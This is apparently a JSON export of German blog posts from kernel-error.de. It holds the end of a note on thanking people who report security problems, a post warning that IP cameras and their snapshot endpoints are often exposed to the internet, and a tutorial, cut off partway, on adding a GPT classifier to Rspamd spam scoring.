meine ich damit nicht die Leute, die erst einmal 5.000 € „Audit-Gebühr“ sehen wollen oder beim ungefragten Pentesting eure komplette IT aus dem Verkehr schießen. Ich meine die Menschen, die euch auf dem REWE-Parkplatz freundlich darauf hinweisen, dass ihr euer Portemonnaie auf dem Autodach liegen gelassen habt.\n\n\n\nBedankt euch einfach."
  },
  {
    "itemId": "https://www.kernel-error.de/?p=3422",
    "raw": "\n<p class=\"has-small-font-size\">Moin, ich mag noch einmal etwas zu IP-Überwachungskameras schreiben. Ihr erinnert euch vielleicht an meinen letzten <a href=\"https://www.kernel-error.de/2025/01/20/geoguessr-im-cyber-sicherheitskontext-wie-ip-kameras-zum-risiko-werden-koennen/\" data-type=\"post\" data-id=\"3109\" target=\"_blank\" rel=\"noreferrer noopener\">Beitrag zu diesem Thema KLICK</a>.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"alignleft size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"1024\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras.png\" alt=\"article image of ip cameras\" class=\"wp-image-3423\" style=\"width:204px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras.png 1024w, https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras-300x300.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras-150x150.png 150w, https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras-768x768.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras-676x676.png 676w\" sizes=\"auto, (max-width: 1024px) 100vw, 1024px\" /></figure></div>\n\n\n<p class=\"has-small-font-size\">Dort habe ich mich speziell auf den RTSP-Port bezogen und auch <a href=\"https://www.shodan.io/\">https://www.shodan</a><a href=\"https://www.shodan.io/\" target=\"_blank\" rel=\"noreferrer noopener\">.</a><a href=\"https://www.shodan.io/\">io/</a> als Beispiel genannt. Shodan scannt unaufhörlich IPv4-Adressen (bei IPv6 wäre ein flächendeckender Scan kaum praktikabel) und stellt seine Ergebnisse öffentlich zur Verfügung. Sicherheitsforscher — aber leider auch Menschen mit schlechten Absichten — bedienen sich solcher Dienste, um Informationen über Systeme hinter einer IPv4-Adresse zu bekommen, ganz ohne selbst groß zu scannen oder zu testen. Grob gesagt: Google für „Hacker“.</p>\n\n\n\n<p class=\"has-small-font-size\">Dass IP-Kameras — vor allem günstige oder ältere Modelle — schnell ein Sicherheitsrisiko darstellen, habe ich schon erwähnt; wer das hier liest, weiß es in der Regel auch. Automatische Portfreigaben in Kombination mit solchen Kameras sind oft problematisch. Wenn ich über so etwas stolpere und ohne großen Aufwand den Betreiber ausfindig machen kann, versuche ich jeweils per E-Mail oder einem kurzen Anruf zu warnen. Das stößt mal auf offene Ohren, manchmal wird es komplett ignoriert (manchmal mit Abschalten des öffentlichen Zugriffs, manchmal ohne); selten kommt die Antwort „Anzeige ist raus“.</p>\n\n\n\n<p class=\"has-small-font-size\">Kameras filmen oft sensible Bereiche, sowohl innen als auch außen. Das kann viele Probleme mit sich bringen, wenn diese Informationen einfach öffentlich zugänglich sind. Anders als bei Datei-Freigaben scheint bei Kamerastreams noch nicht die nötige Awareness vorhanden zu sein — genau deshalb informiere ich hier und weise darauf hin.</p>\n\n\n\n<p class=\"has-small-font-size\">Es ist nicht nur der RTSP-Stream, der sich häufig per UPnP seinen Weg nach draußen „tunnelt“. Oft werden auch per DNAT / Portfreigabe / Portweiterleitung die Webinterfaces der Kameras direkt aus dem Internet erreichbar gemacht. Im schlimmsten Fall kann man also mit dem Browser direkt auf Webinterface und Stream zugreifen. Viele sichern den Zugriff mit der kameraeigenen Anmeldung — das ist schon mal ein Anfang. Leider reicht das nicht immer: Bei manchen Modellen sind Funktionen wie Snapshots oder einzelne JPEG-Endpoints weiterhin ohne Anmeldung erreichbar. Das ist auf den ersten Blick nicht sichtbar — kennt man aber die entsprechende URL, genügt ein Browseraufruf und man sieht wieder alles.</p>\n\n\n\n<p class=\"has-small-font-size\">Deshalb gebe ich immer den Rat: Zugriff lieber hinter ein VPN legen und niemals direkt offen ins Internet. Gebt jedem Gerät und jedem Dienst, den ihr aus dem Internet erreichbar macht, mindestens so viel Vertrauen wie eurer Haustür. Und prüft regelmäßig, ob dieses Vertrauen noch gerechtfertigt ist.</p>\n\n\n\n<p class=\"has-small-font-size\">Wer selbst prüfen möchte, ob die EIGENE Kamera trotz eingerichteter Anmeldung noch irgendwie ohne Login zugänglich ist, kann mein kurzes Python-Tool nutzen: <a href=\"https://github.com/Kernel-Error/cam_probe\" target=\"_blank\" rel=\"noreferrer noopener\">https://github.com/Kernel-Error/cam_probe</a></p>\n\n\n\n<p class=\"has-small-font-size\">Denkt also bitte einmal darüber nach, ob ihr allem, was ihr direkt mit dem Internet verbunden habt, mindestens das gleiche Vertrauen entgegenbringt wie eurer Haustür oder Wohnungstür. Denkt an die <em>security.txt</em> und daran, dass, wenn sich jemand die Mühe macht, euch über ein solches Problem zu informieren, diese Person damit wahrscheinlich den größten Aufwand und auch das größte Risiko für sich selbst aufnimmt – nur, um euch auf ein Problem hinzuweisen.<br>Einen solchen Fund zu ignorieren, zu verkaufen oder sonst wie auszunutzen, ist deutlich einfacher, als den Betreiber zu informieren.</p>\n\n\n\n<p class=\"has-small-font-size\">Natürlich gibt es auch hier schwarze Schafe, aber die Vertrauenswürdigkeit einer solchen Nachricht lässt sich meist schnell per Google oder auch ChatGPT prüfen.<br>Frage? Dann fragen. <img src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/1f642.png\" alt=\"🙂\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n",
    "sanitized": "Moin, ich mag noch einmal etwas zu IP-Überwachungskameras schreiben. Ihr erinnert euch vielleicht an meinen letzten Beitrag zu diesem Thema KLICK.\n\n\n\n\n\n\nDort habe ich mich speziell auf den RTSP-Port bezogen und auch https://www.shodan.io/ als Beispiel genannt. Shodan scannt unaufhörlich IPv4-Adressen (bei IPv6 wäre ein flächendeckender Scan kaum praktikabel) und stellt seine Ergebnisse öffentlich zur Verfügung. Sicherheitsforscher — aber leider auch Menschen mit schlechten Absichten — bedienen sich solcher Dienste, um Informationen über Systeme hinter einer IPv4-Adresse zu bekommen, ganz ohne selbst groß zu scannen oder zu testen. Grob gesagt: Google für „Hacker“.\n\n\n\nDass IP-Kameras — vor allem günstige oder ältere Modelle — schnell ein Sicherheitsrisiko darstellen, habe ich schon erwähnt; wer das hier liest, weiß es in der Regel auch. Automatische Portfreigaben in Kombination mit solchen Kameras sind oft problematisch. Wenn ich über so etwas stolpere und ohne großen Aufwand den Betreiber ausfindig machen kann, versuche ich jeweils per E-Mail oder einem kurzen Anruf zu warnen. Das stößt mal auf offene Ohren, manchmal wird es komplett ignoriert (manchmal mit Abschalten des öffentlichen Zugriffs, manchmal ohne); selten kommt die Antwort „Anzeige ist raus“.\n\n\n\nKameras filmen oft sensible Bereiche, sowohl innen als auch außen. Das kann viele Probleme mit sich bringen, wenn diese Informationen einfach öffentlich zugänglich sind. Anders als bei Datei-Freigaben scheint bei Kamerastreams noch nicht die nötige Awareness vorhanden zu sein — genau deshalb informiere ich hier und weise darauf hin.\n\n\n\nEs ist nicht nur der RTSP-Stream, der sich häufig per UPnP seinen Weg nach draußen „tunnelt“. Oft werden auch per DNAT / Portfreigabe / Portweiterleitung die Webinterfaces der Kameras direkt aus dem Internet erreichbar gemacht. Im schlimmsten Fall kann man also mit dem Browser direkt auf Webinterface und Stream zugreifen. Viele sichern den Zugriff mit der kameraeigenen Anmeldung — das ist schon mal ein Anfang. Leider reicht das nicht immer: Bei manchen Modellen sind Funktionen wie Snapshots oder einzelne JPEG-Endpoints weiterhin ohne Anmeldung erreichbar. Das ist auf den ersten Blick nicht sichtbar — kennt man aber die entsprechende URL, genügt ein Browseraufruf und man sieht wieder alles.\n\n\n\nDeshalb gebe ich immer den Rat: Zugriff lieber hinter ein VPN legen und niemals direkt offen ins Internet. Gebt jedem Gerät und jedem Dienst, den ihr aus dem Internet erreichbar macht, mindestens so viel Vertrauen wie eurer Haustür. Und prüft regelmäßig, ob dieses Vertrauen noch gerechtfertigt ist.\n\n\n\nWer selbst prüfen möchte, ob die EIGENE Kamera trotz eingerichteter Anmeldung noch irgendwie ohne Login zugänglich ist, kann mein kurzes Python-Tool nutzen: https://github.com/Kernel-Error/cam_probe\n\n\n\nDenkt also bitte einmal darüber nach, ob ihr allem, was ihr direkt mit dem Internet verbunden habt, mindestens das gleiche Vertrauen entgegenbringt wie eurer Haustür oder Wohnungstür. Denkt an die security.txt und daran, dass, wenn sich jemand die Mühe macht, euch über ein solches Problem zu informieren, diese Person damit wahrscheinlich den größten Aufwand und auch das größte Risiko für sich selbst aufnimmt – nur, um euch auf ein Problem hinzuweisen.Einen solchen Fund zu ignorieren, zu verkaufen oder sonst wie auszunutzen, ist deutlich einfacher, als den Betreiber zu informieren.\n\n\n\nNatürlich gibt es auch hier schwarze Schafe, aber die Vertrauenswürdigkeit einer solchen Nachricht lässt sich meist schnell per Google oder auch ChatGPT prüfen.Frage? Dann fragen."
  },
  {
    "itemId": "https://www.kernel-error.de/?p=3383",
    "raw": "<div class=\"wp-block-image\">\n<figure class=\"alignleft size-large is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"683\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd-1024x683.png\" alt=\"\" class=\"wp-image-3391\" style=\"width:210px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd-1024x683.png 1024w, https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd-300x200.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd-768x512.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd-676x451.png 676w, https://www.kernel-error.de/wp-content/uploads/2025/09/gpt-in-rspamd.png 1536w\" sizes=\"auto, (max-width: 1024px) 100vw, 1024px\" /></figure></div>\n\n\n<p class=\"has-small-font-size\">Setup: FreeBSD 14.3, Rspamd 3.12.1, Postfix + Dovecot. Ich lasse bei kniffligen Mails zusätzlich ein LLM draufschauen. Wichtig: GPT ist bei mir nur <strong>ein weiterer Sensor</strong> im ganz normalen Rspamd-Scoring — keine Allzweckwaffe und kein „hartes Urteil“.</p>\n\n\n\n<p><strong>Voraussetzungen</strong></p>\n\n\n\n<ul class=\"wp-block-list\">\n<li class=\"has-small-font-size\">Rspamd inkl. <strong>GPT-Plugin</strong> (ab ~3.12.x im Paket; konfiguriert wird in <code>local.d/gpt.conf</code>).</li>\n\n\n\n<li>API-Zugang (OpenAI-kompatibel oder eigener Endpunkt).</li>\n\n\n\n<li>Grundverständnis zu Rspamd-Metrics/Actions (Reject/Add-Header/Greylist).</li>\n</ul>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"alignleft size-large is-resized\"><a href=\"https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"670\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd-1024x670.jpg\" alt=\"\" class=\"wp-image-3387\" style=\"width:217px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd-1024x670.jpg 1024w, https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd-300x196.jpg 300w, https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd-768x502.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd-676x442.jpg 676w, https://www.kernel-error.de/wp-content/uploads/2025/09/openai-api-rspamd.jpg 1378w\" sizes=\"auto, (max-width: 1024px) 100vw, 1024px\" /></a></figure></div>\n\n\n<p class=\"has-small-font-size\"><a href=\"https://platform.openai.com/api-keys\" target=\"_blank\" rel=\"noreferrer noopener\"><strong>OpenAI API Key erstellen</strong>:</a> Melde dich auf der Developer-Plattform an, öffne die Seite <em>API Keys</em> und klicke auf <em>Create new secret key</em>. Lege bei Bedarf Berechtigungen fest oder arbeite mit projektbasierten Keys. Kopiere den Key einmalig und bewahre ihn sicher (root-only) auf – bitte nicht teilen. Nutzung/Kosten siehst du im Usage-Dashboard.</p>\n\n\n\n<p class=\"has-small-font-size\"><strong>Mein <code>gpt.conf</code></strong></p>\n\n\n\n<p class=\"has-small-font-size\">Ich halte die Konfiguration bewusst nüchtern — genug, um robuste Labels zu bekommen, aber ohne Schnickschnack:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\"># local.d/gpt.conf (Auszug)\nenabled = true;\ntype = \"openai\";\nmodel = \"gpt-4o-mini\";\napi_key = \"GEHEIMER-KEY\";\n\nmodel_parameters {\n  gpt-4o-mini {\n    max_tokens = 160;\n    temperature = 0.0;\n  }\n}\n\ntimeout = 10s;\nallow_ham = true;\nallow_passthrough = false;\njson = false;\nreason_header = \"X-GPT-Reason\";\n\ninput = \"text\";\nmin_words = 1;\nmax_size = 256k;\n\nsymbols_to_except {\n  RCVD_IN_DNSWL_MED = -0.1;\n  RCVD_IN_DNSWL_HI  = -0.1;\n  DWL_DNSWL_MED     = -0.1;\n  WHITELIST_RECP_ADDR = -0.1;\n  GREYLIST = 0; GREYLIST_CHECK = 0; GREYLIST_SAVE = 0;\n  RCPT_IN_SPAMTRAP = 0; SPAMTRAP = 0; SPAMTRAP_ADDR = 0;\n  RCVD_VIA_SMTP_AUTH = 0; LOCAL_CLIENT = 0; FROM_LOCAL = 0;\n}</pre>\n\n\n\n<p class=\"has-small-font-size\"><strong>Was</strong> bedeutet das?!</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li class=\"has-small-font-size\"><code>model = gpt-4o-mini</code>: flott &amp; günstig, deterministisch per <code>temperature = 0.0</code>.</li>\n\n\n\n<li class=\"has-small-font-size\"><code>allow_ham = true</code>: GPT darf „HAM“ melden (kleines, positives Signal).</li>\n\n\n\n<li class=\"has-small-font-size\"><code>allow_passthrough = false</code>: Bei Fehlern (Timeout/API down) <strong>keine</strong> stillen Freifahrten.</li>\n\n\n\n<li class=\"has-small-font-size\"><code>reason_header = \"X-GPT-Reason\"</code>: Kurzbegründung landet im Header (s.u. Datenschutz).</li>\n\n\n\n<li class=\"has-small-font-size\"><code>symbols_to_except</code>: Offensichtliche interne Fälle werden neutralisiert, damit GPT nicht in klaren Situationen wirkt.</li>\n\n\n\n<li class=\"has-small-font-size\">Limits: <code>min_words = 1</code>, <code>max_size = 256k</code>, <code>timeout = 10s</code>.</li>\n</ul>\n\n\n\n<p class=\"has-small-font-size\"><strong>Metric/Scoring: drei GPT-Symbole</strong></p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">symbols {\n  GPT_SPAM       { weight = 9.0;  group = \"gpt\"; description = \"GPT: classified as SPAM\"; }\n  GPT_SUSPICIOUS { weight = 4.5;  group = \"gpt\"; description = \"GPT: classified as SUSPICIOUS\"; }\n  GPT_HAM        { weight = -0.5; group = \"gpt\"; one_shot = true; description = \"GPT: classified as HAM\"; }\n}</pre>\n\n\n\n<p class=\"has-small-font-size\">GPT wirkt wie ein starker, aber nicht absoluter Faktor. <br>\n&#8211; <strong>SPAM (9.0)</strong>: kräftiger Zuschlag.<br>\n&#8211; <strong>SUSPICIOUS (4.5)</strong>: sanfter Schubs Richtung Greylist/Review.<br>\n&#8211; <strong>HAM (-0.5)</strong>: kleine Entlastung, einmalig pro Mail.</p>\n\n\n\n<p class=\"has-small-font-size\"><strong>Warum diese Gewichte?</strong><br>Die Zahlen habe ich bewusst so gewählt, dass das GPT-Signal stark, aber nie absolut ist. Rspamd summiert Scores, GPT ist also nur ein Faktor:</p>\n\n\n\n<ul class=\"wp-block-list has-small-font-size\">\n<li><code>GPT_SPAM = 9.0</code>: genug, um bei Kombination mit klassischen Checks (Bayes, RBL, DMARC) die Add-Header-Schwelle sicher zu reißen, aber unterhalb von <em>reject</em> allein.</li>\n\n\n\n<li><code>GPT_SUSPICIOUS = 4.5</code>: halber Wert, schiebt Grauzonen in Richtung Greylist/Review, ohne sofortige Eskalation.</li>\n\n\n\n<li><code>GPT_HAM = -0.5</code>: nur eine kleine Entlastung (one_shot). So verhindert man, dass GPT-HAM mehrere Punkte abzieht und Spams „rettet“.</li>\n</ul>\n\n\n\n<p class=\"has-small-font-size\"><strong>Wie wird die GPT-Gewichtung berechnet?</strong><br>In den Logs/WebUI taucht das oft so auf: <code>GPT_SPAM(2.10)[0.85]</code>. Das bedeutet:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li class=\"has-small-font-size\"><code>[0.85]</code> = Rohwert von GPT, z. B. 85 % Wahrscheinlichkeit für Spam.</li>\n\n\n\n<li class=\"has-small-font-size\"><code>weight</code> aus der Metric (z. B. 9.0 für <code>GPT_SPAM</code>).</li>\n\n\n\n<li class=\"has-small-font-size\">Grundformel: <code>Rohwert × weight</code> → ergibt den Beitrag zum Gesamtscore.</li>\n\n\n\n<li class=\"has-small-font-size\"><em>Hinweis:</em> Je nach Rspamd-Version kann der im Header gezeigte Wert zusätzlich <strong>skaliert</strong> sein (z. B. falls das Modell nur ein „softes“ Signal liefert). Deshalb sieht man in der Praxis häufig 2–8 Punkte statt des Maximalgewichts.</li>\n</ul>\n\n\n\n<p class=\"has-small-font-size\"><strong>Actions/Schwellen</strong></p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">actions {\n  greylist = 4;\n  add_header = 6;\n  reject = 15;\n}</pre>\n\n\n\n<p class=\"has-small-font-size\">SUSPICIOUS (4.5) kippt oft in Greylist. SPAM (9.0) bringt fast immer Add-Header, Reject nur zusammen mit weiteren harten Befunden. Klassische Checks (SPF/DKIM/DMARC, RBL, Bayes) bleiben führend, GPT ergänzt nur.</p>\n\n\n\n<p class=\"has-small-font-size\"><strong>Tuning</strong><br>\nZu bissig? Gewicht etwas senken.<br>\nZu lasch? Gewicht erhöhen.<br>\nZu optimistisch bei HAM? Gewicht kleiner machen oder 0 setzen.<br>\nHeader mit <code>X-GPT-Reason</code> liefert Nachvollziehbarkeit, kann bei Bedarf wieder entfernt werden.</p>\n\n\n\n<p class=\"has-small-font-size\"><strong>Praxis</strong><br>\n&#8211; Symbole erscheinen im WebUI und Logfiles.<br>\n&#8211; <code>X-GPT-Reason</code> erklärt im Header die Bewertung.<br>\n&#8211; Latenz/Kosten: <em>gpt-4o-mini</em> mit 160 Tokens und 10 s Timeout ist performant und günstig.</p>\n\n\n\n<p class=\"has-small-font-size\"><strong>Jetzt schauen wir uns mal die Mailheader eines echten Beispiels an und wie GPT dort gegriffen hat:</strong></p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">X-Spamd-Result: default: False [8.59 / 15.00];\n        VIOLATED_DIRECT_SPF(3.50)[];\n        GPT_SPAM(2.10)[0.85];\n        MISSING_MIMEOLE(2.00)[];\n        CTYPE_MIXED_BOGUS(1.00)[];\n        MID_RHS_NOT_FQDN(0.50)[];\n        DMARC_POLICY_ALLOW_WITH_FAILURES(-0.50)[];\n        MIME_HTML_ONLY(0.20)[];\n        R_DKIM_ALLOW(-0.20)[thejewelbox.dd:s=1759374209.thejewelbox];\n        ...\n</pre>\n\n\n\n<p><strong>Erklärung:</strong></p>\n\n\n\n<ul class=\"wp-block-list has-small-font-size\">\n<li><code>X-Spamd-Result: [8.59 / 15.00]</code> – Gesamtscore 8.59, Reject-Schwelle bei 15. Hier also <em>kein Reject</em>, sondern nur Add-Header.</li>\n\n\n\n<li><code>GPT_SPAM(2.10)[0.85]</code> – GPT meldet Spam mit 85 % Sicherheit (<code>[0.85]</code>). Daraus errechnet Rspamd den Beitrag (<code>(…)</code>), der in den Gesamtscore einfließt.</li>\n\n\n\n<li>Die klassischen Checks wie <code>VIOLATED_DIRECT_SPF(3.50)</code> oder <code>MISSING_MIMEOLE(2.00)</code> haben ebenfalls beigetragen – GPT ist also nur <strong>ein Faktor</strong> im Gesamtbild.</li>\n</ul>\n\n\n\n<p class=\"has-small-font-size\"><strong>Zusätzlich schreibt das GPT-Modul auf Wunsch auch eine kurze Begründung in den Mailheader:</strong></p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">X-GPT-Reason: This email is likely spam due to the urgency created around an unpaid invoice and the mismatch between the sender's domain and the company name.</pre>\n\n\n\n<p><strong>Erklärung:</strong></p>\n\n\n\n<ul class=\"wp-block-list\">\n<li class=\"has-small-font-size\"><code>X-GPT-Reason</code> – eigener Header, den du in <code>gpt.conf</code> mit <code>reason_header = \"X-GPT-Reason\"</code> aktivierst.</li>\n\n\n\n<li class=\"has-small-font-size\">Der Text stammt direkt aus dem Modell und begründet die Einstufung (hier: Dringlichkeit „unpaid invoice“ + Domain/Company-Mismatch).</li>\n\n\n\n<li class=\"has-small-font-size\">Nützlich für Analyse/Transparenz; kann auf MTA/MDA-Ebene wieder entfernt werden, wenn du ihn nicht bis zum Postfach durchreichen willst.</li>\n</ul>\n\n\n\n<p class=\"has-small-font-size\"><strong>Ein Hinweis zum Datenschutz (gesamt)</strong><br>Mit GPT-Integration gehen Mailinhalte an einen externen Dienst (z. B. OpenAI). Das kann datenschutzrechtlich relevant sein. Wer sensible oder personenbezogene Daten verarbeitet, sollte vorher prüfen, ob die Nutzung zulässig ist – oder alternativ ein selbst gehostetes, OpenAI-kompatibles Modell nutzen (z. B. <a href=\"https://ollama.com/\" target=\"_blank\" rel=\"noreferrer noopener\">Ollama</a>). Den Reason-Header kannst du, falls nötig, serverseitig wieder entfernen.</p>\n",
    "sanitized": "Setup: FreeBSD 14.3, Rspamd 3.12.1, Postfix + Dovecot. Ich lasse bei kniffligen Mails zusätzlich ein LLM draufschauen. Wichtig: GPT ist bei mir nur ein weiterer Sensor im ganz normalen Rspamd-Scoring — keine Allzweckwaffe und kein „hartes Urteil“.\n\n\n\nVoraussetzungen\n\n\n\n\nRspamd inkl. GPT-Plugin (ab ~3.12.x im Paket; konfiguriert wird in local.d/gpt.conf).\n\n\n\nAPI-Zugang (OpenAI-kompatibel oder eigener Endpunkt).\n\n\n\nGrundverständnis zu Rspamd-Metrics/Actions (Reject/Add-Header/Greylist).\n\n\n\n\n\n\n\nOpenAI API Key erstellen: Melde dich auf der Developer-Plattform an, öffne die Seite API Keys und klicke auf Create new secret key. Lege bei Bedarf Berechtigungen fest oder arbeite mit projektbasierten Keys. Kopiere den Key einmalig und bewahre ihn sicher (root-only) auf – bitte nicht teilen. Nutzung/Kosten siehst du im Usage-Dashboard.\n\n\n\nMein gpt.conf\n\n\n\nIch halte die Konfiguration bewusst nüchtern — genug, um robuste Labels zu bekommen, aber ohne Schnickschnack:\n\n\n\n# local.d/gpt.conf (Auszug)\nenabled = true;\ntype = \"openai\";\nmodel = \"gpt-4o-mini\";\napi_key = \"GEHEIMER-KEY\";\n\nmodel_parameters {\n  gpt-4o-mini {\n    max_tokens = 160;\n    temperature = 0.0;\n  }\n}\n\ntimeout = 10s;\nallow_ham = true;\nallow_passthrough = false;\njson = false;\nreason_header = \"X-GPT-Reason\";\n\ninput = \"text\";\nmin_words = 1;\nmax_size = 256k;\n\nsymbols_to_except {\n  RCVD_IN_DNSWL_MED = -0.1;\n  RCVD_IN_DNSWL_HI  = -0.1;\n  DWL_DNSWL_MED     = -0.1;\n  WHITELIST_RECP_ADDR = -0.1;\n  GREYLIST = 0; GREYLIST_CHECK = 0; GREYLIST_SAVE = 0;\n  RCPT_IN_SPAMTRAP = 0; SPAMTRAP = 0; SPAMTRAP_ADDR = 0;\n  RCVD_VIA_SMTP_AUTH = 0; LOCAL_CLIENT = 0; FROM_LOCAL = 0;\n}\n\n\n\nWas bedeutet das?!\n\n\n\n\nmodel = gpt-4o-mini: flott & günstig, deterministisch per temperature = 0.0.\n\n\n\nallow_ham = true: GPT darf „HAM“ melden (kleines, positives Signal).\n\n\n\nallow_passthrough = false: Bei Fehlern (Timeout/API down) keine stillen Freifahrten.\n\n\n\nreason_header = \"X-GPT-Reason\": Kurzbegründung landet im Header (s.u. Datenschutz).\n\n\n\nsymbols_to_except: Offensichtliche interne Fälle werden neutralisiert, damit GPT nicht in klaren Situationen wirkt.\n\n\n\nLimits: min_words = 1, max_size = 256k, timeout = 10s.\n\n\n\n\nMetric/Scoring: drei GPT-Symbole\n\n\n\nsymbols {\n  GPT_SPAM       { weight = 9.0;  group = \"gpt\"; description = \"GPT: classified as SPAM\"; }\n  GPT_SUSPICIOUS { weight = 4.5;  group = \"gpt\"; description = \"GPT: classified as SUSPICIOUS\"; }\n  GPT_HAM        { weight = -0.5; group = \"gpt\"; one_shot = true; description = \"GPT: classified as HAM\"; }\n}\n\n\n\nGPT wirkt wie ein starker, aber nicht absoluter Faktor. \n– SPAM (9.0): kräftiger Zuschlag.\n– SUSPICIOUS (4.5): sanfter Schubs Richtung Greylist/Review.\n– HAM (-0.5): kleine Entlastung, einmalig pro Mail.\n\n\n\nWarum diese Gewichte?Die Zahlen habe ich bewusst so gewählt, dass das GPT-Signal stark, aber nie absolut ist. Rspamd summiert Scores, GPT ist also nur ein Faktor:\n\n\n\n\nGPT_SPAM = 9.0: genug, um bei Kombination mit klassischen Checks (Bayes, RBL, DMARC) die Add-Header-Schwelle sicher zu reißen, aber unterhalb von reject allein.\n\n\n\nGPT_SUSPICIOUS = 4.5: halber Wert, schiebt Grauzonen in Richtung Greylist/Review, ohne sofortige Eskalation.\n\n\n\nGPT_HAM = -0.5: nur eine kleine Entlastung (one_shot). So verhindert man, dass GPT-HAM mehrere Punkte abzieht und Spams „rettet“.\n\n\n\n\nWie wird die GPT-Gewichtung berechnet?In den Logs/WebUI taucht das oft so auf: GPT_SPAM(2.10)[0.85]. Das bedeutet:\n\n\n\n\n[0.85] = Rohwert von GPT, z. B. 85 % Wahrscheinlichkeit für Spam.\n\n\n\nweight aus der Metric (z. B. 9.0 für GPT_SPAM).\n\n\n\nGrundformel: Rohwert × weight → ergibt den Beitrag zum Gesamtscore.\n\n\n\nHinweis: Je nach Rspamd-Version kann der im Header gezeigte Wert zusätzlich skaliert sein (z. B. falls das Modell nur ein „softes“ Signal liefert). Deshalb sieht man in der Praxis häufig 2–8 Punkte statt des Maximalgewichts.\n\n\n\n\nActions/Schwellen\n\n\n\nactions {\n  greylist = 4;\n  add_header = 6;\n  reject = 15;\n}\n\n\n\nSUSPICIOUS (4.5) kippt oft in Greylist. SPAM (9.0) bringt fast immer Add-Header, Reject nur zusammen mit weiteren harten Befunden. Klassische Checks (SPF/DKIM/DMARC, RBL, Bayes) bleiben führend, GPT ergänzt nur.\n\n\n\nTuning\nZu bissig? Gewicht etwas senken.\nZu lasch? Gewicht erhöhen.\nZu optimistisch bei HAM? Gewicht kleiner machen oder 0 setzen.\nHeader mit X-GPT-Reason liefert Nachvollziehbarkeit, kann bei Bedarf wieder entfernt werden.\n\n\n\nPraxis\n– Symbole erscheinen im WebUI und Logfiles.\n– X-GPT-Reason erklärt im Header die Bewertung.\n– Latenz/Kosten: gpt-4o-mini mit 160 Tokens und 10 s Timeout ist performant und günstig.\n\n\n\nJetzt schauen wir uns mal die Mailheader eines echten Beispiels an und wie GPT dort gegriffen hat:\n\n\n\nX-Spamd-Result: default: False [8.59 / 15.00];\n        VIOLATED_DIRECT_SPF(3.50)[];\n        GPT_SPAM(2.10)[0.85];\n        MISSING_MIMEOLE(2.00)[];\n        CTYPE_MIXED_BOGUS(1.00)[];\n        MID_RHS_NOT_FQDN(0.50)[];\n        DMARC_POLICY_ALLOW_WITH_FAILURES(-0.50)[];\n        MIME_HTML_ONLY(0.20)[];\n        R_DKIM_ALLOW(-0.20)[thejewelbox.dd:s=1759374209.thejewelbox];\n        ...\n\n\n\n\nErklärung:\n\n\n\n\nX-Spamd-Result: [8.59 / 15.00] – Gesamtscore 8.59, Reject-Schwelle bei 15. Hier also kein Reject, sondern nur Add-Header.\n\n\n\nGPT_SPAM(2.10)[0.85] – GPT meldet Spam mit 85 % Sicherheit ([0.85]). Daraus errechnet Rspamd den Beitrag ((…)), der in den Gesamtscore einfließt.\n\n\n\nDie klassischen Checks wie VIOLATED_DIRECT_SPF(3.50) oder MISSING_MIMEOLE(2.00) haben ebenfalls beigetragen – GPT ist also nur ein Faktor im Gesamtbild.\n\n\n\n\nZusätzlich schreibt das GPT-Modul auf Wunsch auch eine kurze Begründung in den Mailheader:\n\n\n\nX-GPT-Reason: This email is likely spam due to the urgency created around an unpaid invoice and the mismatch between the sender's domain and the company name.\n\n\n\nErklärung:\n\n\n\n\nX-GPT-Reason – eigener Header, den du in gpt.conf mit reason_header = \"X-GPT-Reason\" aktivierst.\n\n\n\nDer Text stammt direkt aus dem Modell und 